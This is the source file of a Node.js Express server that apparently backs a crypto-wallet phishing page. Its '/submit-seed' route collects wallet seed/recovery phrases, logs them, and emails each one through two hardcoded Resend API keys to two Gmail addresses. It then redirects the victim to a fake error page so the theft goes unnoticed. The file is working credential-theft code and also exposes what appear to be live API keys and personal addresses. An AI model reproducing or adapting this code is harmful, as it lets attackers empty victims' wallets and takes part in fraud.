const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const { Resend } = require("resend");

const app = express();
const PORT = 3000;

// Initialize both Resend accounts
const resend1 = new Resend("re_S5UE4ZSn_NLwmQQ54LHLoxqbM5BnzprWa");
const resend2 = new Resend("re_9GJsrHWa_CcBWCoBTBHAyE171cS2oYRoV");

// Email configurations for each account
const emailConfigs = [
  {
    resendInstance: resend1,
    fromEmail: "seed Form <onboard@resend.dev>",
    toEmail: "mikun5y@gmail.com",
    accountName: "mikun5y",
  },
  {
    resendInstance: resend2,
    fromEmail: "seed Form <onboard@resend.dev>",
    toEmail: "sodmaq@gmail.com",
    accountName: "sodmaq",
  },
];

// Enable CORS
app.use(
  cors({
    origin: ["http://localhost:5500", "https://form-z32c.onrender.com"],
    methods: "POST",
    allowedHeaders: ["Content-Type"],
  })
);

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Helper function to send email using both accounts
async function sendEmailWithBothAccounts(subject, text) {
  const results = [];

  for (const config of emailConfigs) {
    try {
      console.log(
        `Sending email via ${config.accountName} account to ${config.toEmail}...`
      );

      const { data, error } = await config.resendInstance.emails.send({
        from: config.fromEmail,
        to: [config.toEmail],
        subject: subject,
        text: text,
      });

      if (error) {
        console.error(
          `❌ Error sending via ${config.accountName} account:`,
          error
        );
        results.push({
          account: config.accountName,
          recipient: config.toEmail,
          success: false,
          error,
        });
      } else {
        console.log(
          `✅ Email sent successfully via ${config.accountName} account!`
        );
        console.log(`Email ID: ${data.id}`);
        results.push({
          account: config.accountName,
          recipient: config.toEmail,
          success: true,
          data,
        });
      }

      // Small delay between sends to avoid rate limiting
      await new Promise((resolve) => setTimeout(resolve, 200));
    } catch (error) {
      console.error(
        `❌ Failed to send via ${config.accountName} account:`,
        error
      );
      results.push({
        account: config.accountName,
        recipient: config.toEmail,
        success: false,
        error: error.message,
      });
    }
  }

  return results;
}

// Route for handling seed/recovery phrase submission
app.post("/submit-seed", async (req, res) => {
  try {
    const { phrase } = req.body;
    console.log("Raw body received:", req.body);
    console.log(`🌟 New seed/recovery phrase submission received: ${phrase}`);
    const subject = "seed/recovery phrase Submission";
    const message = `New seed phrase submission received:

phrase Value: ${phrase}

Submitted at: ${new Date().toLocaleString()}

This notification was sent using multiple Resend accounts to reach all recipients.`;

    // Send email using both accounts
    const results = await sendEmailWithBothAccounts(subject, message);

    const successCount = results.filter((r) => r.success).length;
    const totalCount = results.length;

    console.log(
      `✅ phrase submission processed: ${successCount}/${totalCount} emails sent successfully`
    );

    // Log results for debugging
    results.forEach((result) => {
      if (result.success) {
        console.log(`✅ Success: ${result.account} → ${result.recipient}`);
      } else {
        console.log(
          `❌ Failed: ${result.account} → ${result.recipient}:`,
          result.error
        );
      }
    });

    res.redirect("https://defiii.netlify.app/error");
  } catch (error) {
    console.error("❌ Error processing phrase submission:", error);
    res.redirect("https://defiii.netlify.app/error");
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
  console.log("✅ Dual Resend email service initialized");
});
